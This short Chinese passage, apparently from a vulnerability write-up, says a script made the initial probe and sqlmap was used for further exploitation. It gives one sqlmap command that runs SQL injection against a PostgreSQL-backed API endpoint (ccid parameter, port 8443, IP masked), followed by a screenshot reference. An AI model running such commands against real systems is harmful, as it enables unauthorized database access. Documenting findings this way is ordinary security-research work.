使用脚本进行初步探测，利用sqlmap进一步进行利用
``` 
sqlmap -u https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL --batch
```
！[image](images/sqlmap.png)

